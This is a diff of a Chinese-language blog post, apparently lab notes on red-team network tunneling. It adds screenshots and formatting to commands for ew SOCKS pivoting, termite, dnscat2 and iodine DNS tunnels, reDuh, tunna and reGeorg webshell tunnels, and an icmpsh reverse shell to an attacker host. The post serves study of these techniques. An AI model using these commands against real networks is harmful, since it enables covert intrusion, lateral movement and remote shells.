@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k 字
+      1.2k 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      15
        分钟
     </span>
   
@@ -241,66 +241,97 @@
 <p>编辑代理链的文件/etc/proxychains.conf设置代理，设置socks</p>
 <p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131005345851.png" srcset="/img/loading.gif" alt="image-20210131005345851"></p>
 <p>此时使用proxychains连接客户机所在内网的任何一台机器都OK</p>
-<h3 id="3-ew"><a href="#3-ew" class="headerlink" title="3.ew"></a>3.ew</h3><p>1.正向代理</p>
-<p>在客户机上开启socks服务监听指定端口：<code>ew_win32.exe -s ssocksd -l 1080</code> （-s：指定协议，-l:指定端口）</p>
-<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131010255428.png" srcset="/img/loading.gif" alt="image-20210131010255428"></p>
+<h3 id="3-ew"><a href="#3-ew" class="headerlink" title="3.ew"></a>3.ew</h3><h4 id="1-正向代理"><a href="#1-正向代理" class="headerlink" title="1.正向代理"></a>1.正向代理</h4><p>在客户机1上开启socks服务监听指定端口：<code>ew_win32.exe -s ssocksd -l 1080</code> （-s：指定协议，-l:指定端口）</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205163217525.png" srcset="/img/loading.gif" alt="image-20210205163217525"></p>
 <p>由于攻击机和客户机IP不一样，所以需要改变攻击机代理链配置文件</p>
-<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131010953590.png" srcset="/img/loading.gif" alt="image-20210131010953590"></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205164144197.png" srcset="/img/loading.gif" alt="image-20210205164144197"></p>
 <p>连接客户机1即可：<code>proxychains rdesktop 192.168.43.127</code></p>
-<p>流量走向</p>
-<p>攻击机&lt;—&gt;客户机1&lt;—&gt;客户机2</p>
-<p>2.反向代理</p>
-<p>在客户机开启一个socks代理，把本地的流量从port1转发到port2端口：<code>ew_win32.exe -s rcsocksd -l port1 -e port2</code></p>
-<p>在客户机1开启一个socks代理把本地的流量转发到客户机的port2上：<code>ew_win32.exe -s rssocksd -d host1 -e port2</code></p>
-<p>连接即可</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205163455839.png" srcset="/img/loading.gif" alt="image-20210205163455839"></p>
+<p>本次实验win7也能成功。</p>
+<h4 id="2-反向代理"><a href="#2-反向代理" class="headerlink" title="2.反向代理"></a>2.反向代理</h4><p>在客户机开启一个socks代理，把本地的流量从port1转发到port2端口：<code>ew_win32.exe -s rcsocks -l port1 -e port2</code></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205170622445.png" srcset="/img/loading.gif" alt="image-20210205170622445"></p>
+<p>在客户机1开启一个socks代理把本地的流量转发到客户机的port2上：<code>ew_win32.exe -s rssocks -d host1 -e port2</code></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205170632277.png" srcset="/img/loading.gif" alt="image-20210205170632277"></p>
+<p>编辑代理链的文件/etc/proxychains.conf设置代理，设置socks为客户机</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205170718271.png" srcset="/img/loading.gif" alt="image-20210205170718271"></p>
+<p>连接客户机1即可</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205170757366.png" srcset="/img/loading.gif" alt="image-20210205170757366"></p>
 <p>流量走向</p>
 <p>攻击机&lt;—&gt;客户机1:port&lt;—&gt;客户机1:port2&lt;—&gt;客户机2</p>
-<p>3.端口转发</p>
-<p>1.</p>
-<p>2.</p>
 <h3 id="4-termite"><a href="#4-termite" class="headerlink" title="4.termite"></a>4.termite</h3><p>客户端监听端口：<code>agent_win32.exe -l port</code></p>
 <p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131012439648.png" srcset="/img/loading.gif" alt="image-20210131012439648"></p>
-<p>服务端连接到客户端即可：./admin_linux_i586 -c 客户端ip -p 客户端port</p>
+<p>服务端连接到客户端即可：<code>./admin_linux_i586 -c 客户端ip -p 客户端port</code></p>
 <p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131012515965.png" srcset="/img/loading.gif" alt="image-20210131012515965"></p>
 <p>根据提示选择对应的功能即可，但是在使用socks时候要编辑代理链为本地</p>
+<p>本次只测试了win7，没有测试win2k8</p>
 <h2 id="2-dns协议"><a href="#2-dns协议" class="headerlink" title="2.dns协议"></a>2.dns协议</h2><h3 id="1-dnscat"><a href="#1-dnscat" class="headerlink" title="1.dnscat"></a>1.dnscat</h3><p>1.dnscat2</p>
+<p>这里由于我新版的机器安装ruby很麻烦，所以把以前的贴图放出来（kali，win2k8）</p>
 <p>分为客户端和服务端，但是客户端只支持Windows</p>
-<p>服务端建立监听(服务端需要ruby环境)：ruby dnscat2.rb –dns “domain=pentestlab, host=lhost” –no-cache</p>
-<p>客户端连接到服务端：dnscat2-v0.07-client-win32.exe –dns server=服务端ip</p>
+<p>服务端建立监听(服务端需要ruby环境)：<code>ruby dnscat2.rb --dns &quot;domain=pentestlab, host=lhost&quot; --no-cache</code></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172526702.png" srcset="/img/loading.gif" alt="image-20210205172526702"></p>
+<p>客户端连接到服务端：<code>dnscat2-v0.07-client-win32.exe --dns server=服务端ip</code></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172537723.png" srcset="/img/loading.gif" alt="image-20210205172537723"></p>
+<p>连接成功</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172610917.png" srcset="/img/loading.gif" alt="image-20210205172610917"></p>
 <p>可以执行的命令</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172622495.png" srcset="/img/loading.gif" alt="image-20210205172622495"></p>
 <p>查看会话信息：windows</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172632718.png" srcset="/img/loading.gif" alt="image-20210205172632718"></p>
 <p>与会话进行交互：session -i id</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172641743.png" srcset="/img/loading.gif" alt="image-20210205172641743"></p>
 <p>进行交互之后可以执行的命令</p>
-<p>如何得到windows的cmd？</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172650493.png" srcset="/img/loading.gif" alt="image-20210205172650493"></p>
+<p><strong>如何得到windows的cmd？</strong></p>
 <p>执行shell，创建一个新的会话信息</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172713447.png" srcset="/img/loading.gif" alt="image-20210205172713447"></p>
 <p>返回主界面查看cmd会话建立</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172722855.png" srcset="/img/loading.gif" alt="image-20210205172722855"></p>
 <p>进入cmd交互</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205172730585.png" srcset="/img/loading.gif" alt="image-20210205172730585"></p>
 <h3 id="2-iodine（速度快，不支持win10）"><a href="#2-iodine（速度快，不支持win10）" class="headerlink" title="2.iodine（速度快，不支持win10）"></a>2.iodine（速度快，不支持win10）</h3><p>iodine基于C语言开发，分为服务端程序iodined和客户端程序 iodine，kali系统已内置。支持EDNS、base32，base64，base128等多种编码规范</p>
-<h2 id="3-http协议"><a href="#3-http协议" class="headerlink" title="3.http协议"></a>3.http协议</h2><h3 id="1-reduh（对aspx好一丢丢）"><a href="#1-reduh（对aspx好一丢丢）" class="headerlink" title="1.reduh（对aspx好一丢丢）"></a>1.reduh（对aspx好一丢丢）</h3><p>支持aspx、jsp、php(php不稳定，以下为jsp环境测试)</p>
+<p>攻击机执行：<code>iodined -p 1234 -f -DD 192.168.43.30 abc.com</code></p>
+<p>客户机执行：<code>iodine -p 1234 -f -r -T TXT 192.168.43.30 abc.com</code></p>
+<p>我没复现出来。。。</p>
+<h2 id="3-http协议"><a href="#3-http协议" class="headerlink" title="3.http协议"></a>3.http协议</h2><p>这一个板块，由于我没有配环境，直接将之前的拿出来了。。。。</p>
+<h3 id="1-reduh（对aspx好一丢丢）"><a href="#1-reduh（对aspx好一丢丢）" class="headerlink" title="1.reduh（对aspx好一丢丢）"></a>1.reduh（对aspx好一丢丢）</h3><p>支持aspx、jsp、php(php不稳定，以下为jsp环境测试)</p>
 <p>把webshell上传至客户端，访问以后成功出现以下情况</p>
-<p>服务端连接，（服务端是Java环境）：java -jar reDuhClient.jar webshell地址</p>
-<p>连接成功会监听本地的1010端口，使用nc连接即可：nc -vv localhost 1010</p>
-<p>但是只能进行端口转功能，将目标转发至本地：[createTunnel]lport:127.0.0.1:rport</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205175857271.png" srcset="/img/loading.gif" alt="image-20210205175857271"></p>
+<p>服务端连接，（服务端是Java环境）：<code>java -jar reDuhClient.jar webshell地址</code></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205175849425.png" srcset="/img/loading.gif" alt="image-20210205175849425"></p>
+<p>连接成功会监听本地的1010端口，使用nc连接即可：<code>nc -vv localhost 1010</code></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205175907641.png" srcset="/img/loading.gif" alt="image-20210205175907641"></p>
+<p>但是只能进行端口转功能，将目标转发至本地：<code>[createTunnel]lport:127.0.0.1:rport</code></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205175927785.png" srcset="/img/loading.gif" alt="image-20210205175927785"></p>
 <p>但是连接后不稳定会断开</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205175937357.png" srcset="/img/loading.gif" alt="image-20210205175937357"></p>
 <h3 id="2-tunna（对aspx好一点）"><a href="#2-tunna（对aspx好一点）" class="headerlink" title="2.tunna（对aspx好一点）"></a>2.tunna（对aspx好一点）</h3><p>支持aspx、jsp、php</p>
 <p>将webshell传至客户机后访问成功出现以下情况</p>
-<p>服务端执行：pyhon proxy.py -u webshell地址 -l 4444 -r 3389 -s -v –no-socks</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180009697.png" srcset="/img/loading.gif" alt="image-20210205180009697"></p>
+<p>服务端执行：<code>pyhon proxy.py -u webshell地址 -l 4444 -r 3389 -s -v --no-socks</code></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180028394.png" srcset="/img/loading.gif" alt="image-20210205180028394"></p>
 <p>直接报错。。。</p>
 <h3 id="3-regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）"><a href="#3-regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）" class="headerlink" title="3.regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）"></a>3.regeorg（前两款均是转发端口，此款工具在远程端开启一个socks服务）</h3><p>支持jsp、aspx、php、ashx</p>
 <p>将webshell上传至客户端成功后访问显示</p>
-<p>服务端在本地指定端口上开启一个socks服务：python reGeorgSocksProxy.py -p port -u webshell地址</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180039563.png" srcset="/img/loading.gif" alt="image-20210205180039563"></p>
+<p>服务端在本地指定端口上开启一个socks服务：<code>python reGeorgSocksProxy.py -p port -u webshell地址</code></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180047311.png" srcset="/img/loading.gif" alt="image-20210205180047311"></p>
 <p>设置本地的代理链为指定的端口</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180100801.png" srcset="/img/loading.gif" alt="image-20210205180100801"></p>
 <p>连接即可</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180110603.png" srcset="/img/loading.gif" alt="image-20210205180110603"></p>
 <p>但是http比较慢</p>
 <h3 id="4-neo-regeorg"><a href="#4-neo-regeorg" class="headerlink" title="4.neo-regeorg"></a>4.neo-regeorg</h3><p>支持加密</p>
-<p>服务端使用参数k指定密码，成功后会在相应文件夹下生成对应的webshellpython neoreg.py generate -k 密码</p>
+<p>服务端使用参数k指定密码，成功后会在相应文件夹下生成对应的webshell:<code>python neoreg.py generate -k 密码</code></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205180155972.png" srcset="/img/loading.gif" alt="image-20210205180155972"></p>
 <p>使用同reGeorg类似</p>
 <h2 id="4-icmp协议"><a href="#4-icmp协议" class="headerlink" title="4.icmp协议"></a>4.icmp协议</h2><h3 id="1-icmpsh"><a href="#1-icmpsh" class="headerlink" title="1.icmpsh"></a>1.icmpsh</h3><p>执行前在服务端执行：<code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></p>
 <p>然后服务端继续执行：<code>python icmpsh_m.py lhost rhost</code></p>
-<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131021805627.png" srcset="/img/loading.gif" alt="image-20210131021805627"></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205153640852.png" srcset="/img/loading.gif" alt="image-20210205153640852"></p>
 <p>执行完后不会有什么反应，在客户端使用参数t连接服务端：<code>icmpsh.exe -t rhost</code></p>
-<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131014123716.png" srcset="/img/loading.gif" alt="image-20210131014123716"></p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205153625385.png" srcset="/img/loading.gif" alt="image-20210205153625385"></p>
 <p>成功后服务端得到一个shell</p>
+<p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205153604374.png" srcset="/img/loading.gif" alt="image-20210205153604374"></p>
+<p>本次实验在win2008上进行的，因为win7连接失败了，连接后一直接收不到。</p>
 
             </div>
             <hr>
